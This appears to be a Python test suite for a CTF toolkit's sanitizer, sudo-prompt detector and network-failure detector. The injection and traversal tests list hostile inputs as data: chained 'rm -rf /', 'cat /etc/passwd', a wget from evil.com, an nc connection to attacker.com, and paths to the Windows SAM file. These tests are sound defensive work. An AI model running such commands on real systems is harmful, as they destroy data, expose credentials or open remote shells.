"""Comprehensive security testing for CTF Toolkit Phase 2.

Tests command injection, network isolation, privilege escalation, and other
security aspects of the platform.
"""

import asyncio
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from typing import List
from unittest.mock import AsyncMock, MagicMock, patch

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from src.ctf_core.utils.sanitize import sanitize_command, ALLOWED_BINARIES
from src.ctf_core.utils.sudo_guard import detect_sudo_prompt
from src.ctf_core.utils.net_guard import detect_network_failure


class TestCommandInjection(unittest.TestCase):
    """Test command injection prevention."""
    
    def test_basic_injection_patterns(self):
        """Test common command injection patterns are blocked."""
        # Test with nmap binary and injection attempts in args
        injection_attempts = [
            ["192.168.1.1; rm -rf /"],
            ["192.168.1.1 && rm -rf /"],
            ["192.168.1.1 | rm -rf /"],
            ["192.168.1.1`rm -rf /`"],
            ["192.168.1.1$(rm -rf /)"],
            ["192.168.1.1; cat /etc/passwd"],
            ["192.168.1.1 && wget evil.com/malware"],
            ["192.168.1.1 | nc attacker.com 4444"],
        ]
        
        for args in injection_attempts:
            with self.assertRaises(ValueError, msg=f"Injection attempt should be caught: {args}"):
                sanitize_command("nmap", args)
    
    def test_path_traversal(self):
        """Test path traversal attacks are blocked."""
        traversal_attempts = [
            ["../../../etc/passwd"],
            ["..\\..\\..\\Windows\\System32\\config\\SAM"],
            ["....//....//etc/passwd"],
        ]
        
        for args in traversal_attempts:
            with self.assertRaises(ValueError, msg=f"Path traversal should be caught: {args}"):
                sanitize_command("nmap", args)
    
    def test_allowed_commands_pass(self):
        """Test that legitimate commands pass sanitization."""
        legitimate_commands = [
            (["192.168.1.1"], "-sV"),
            (["-u", "http://example.com"], ""),
            (["apache", "2.4.49"], ""),
        ]
        
        for binary, extra_args in [("nmap", ["192.168.1.1", "-sV"]), 
                                    ("searchsploit", ["apache", "2.4.49"])]:
            try:
                result = sanitize_command(binary, extra_args)
                self.assertEqual(result[0], True, f"Legitimate command should pass: {binary} {extra_args}")
            except Exception as e:
                self.fail(f"Legitimate command raised exception: {binary} {extra_args} - {e}")


class TestSudoGuard(unittest.TestCase):
    """Test sudo prompt detection."""
    
    def test_sudo_prompt_detection(self):
        """Test detection of sudo prompts in stderr."""
        sudo_prompts = [
            "[sudo] password for user:",
            "Password:",
            "sudo: a password is required",
            "Sorry, try again.",
            "sudo: 3 incorrect password attempts",
        ]
        
        for prompt in sudo_prompts:
            result = detect_sudo_prompt(prompt)
            self.assertTrue(result, f"Sudo prompt should be detected: {prompt}")
    
    def test_normal_output_passes(self):
        """Test that normal command output doesn't trigger sudo guard."""
        normal_outputs = [
            "Starting Nmap 7.92",
            "Host is up (0.0012s latency)",
            "PORT   STATE SERVICE VERSION",
            "80/tcp open  http    Apache httpd",
        ]
        
        for output in normal_outputs:
            result = detect_sudo_prompt(output)
            self.assertFalse(result, f"Normal output should not trigger sudo guard: {output}")


class TestNetworkFailureDetection(unittest.TestCase):
    """Test network failure detection."""
    
    def test_network_failure_patterns(self):
        """Test detection of network failure patterns."""
        failure_outputs = [
            "host down",
            "no route to host",
            "connection refused",
            "network unreachable",
            "name resolution failed",
            "could not resolve host",
            "failed to connect to target",
            "timeout exceeded",
        ]
        
        for output in failure_outputs:
            result = detect_network_failure(output)
            self.assertIsNotNone(result, f"Network failure should be detected: {output}")
    
    def test_normal_output_no_failure(self):
        """Test that normal output doesn't trigger network failure detection."""
        normal_outputs = [
            "Starting Nmap 7.92",
            "Host is up (0.0012s latency)",
            "PORT   STATE SERVICE VERSION",
            "80/tcp open  http    Apache httpd",
        ]
        
        for output in normal_outputs:
            result = detect_network_failure(output)
            self.assertIsNone(result, f"Normal output should not trigger failure detection: {output}")


class TestSecurityIntegration(unittest.TestCase):
    """Integration tests for security features."""
    
    def test_command_execution_flow(self):
        """Test complete command execution with security checks."""
        # Simulate a command execution flow with all security checks
        binary = "nmap"
        args = ["-sV", "192.168.1.1"]
        
        # 1. Sanitize command
        result = sanitize_command(binary, args)
        self.assertEqual(result[0], True, "Command should pass sanitization")
        
        
        # 3. Check for sudo prompts (simulate stderr)
        stderr_output = "Starting Nmap 7.92"
        sudo_detected = detect_sudo_prompt(stderr_output)
        self.assertFalse(sudo_detected, "No sudo prompt should be detected")
        
        # 4. Check for network failures (simulate output)
        stdout_output = "Host is up"
        network_failure = detect_network_failure(stdout_output)
        self.assertIsNone(network_failure, "No network failure should be detected")
    
    def test_malicious_command_blocked(self):
        """Test that malicious commands are blocked at multiple layers."""
        # Test injection in arguments
        malicious_args = ["192.168.1.1; rm -rf /"]
        
        # Should be caught by sanitization
        with self.assertRaises(ValueError, msg="Malicious command should be caught by sanitizer"):
            sanitize_command("nmap", malicious_args)


def run_security_tests():
    """Run all security tests and generate report."""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add test classes
    suite.addTests(loader.loadTestsFromTestCase(TestCommandInjection))
    suite.addTests(loader.loadTestsFromTestCase(TestSudoGuard))
    suite.addTests(loader.loadTestsFromTestCase(TestNetworkFailureDetection))
    suite.addTests(loader.loadTestsFromTestCase(TestSecurityIntegration))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Generate report
    report = {
        "total_tests": result.testsRun,
        "failures": len(result.failures),
        "errors": len(result.errors),
        "success": result.wasSuccessful(),
    }
    
    print("\n" + "="*70)
    print("SECURITY TEST REPORT")
    print("="*70)
    print(f"Total Tests: {report['total_tests']}")
    print(f"Failures: {report['failures']}")
    print(f"Errors: {report['errors']}")
    print(f"Status: {'✅ PASSED' if report['success'] else '❌ FAILED'}")
    print("="*70)
    
    return report


if __name__ == "__main__":
    report = run_security_tests()
    sys.exit(0 if report["success"] else 1)
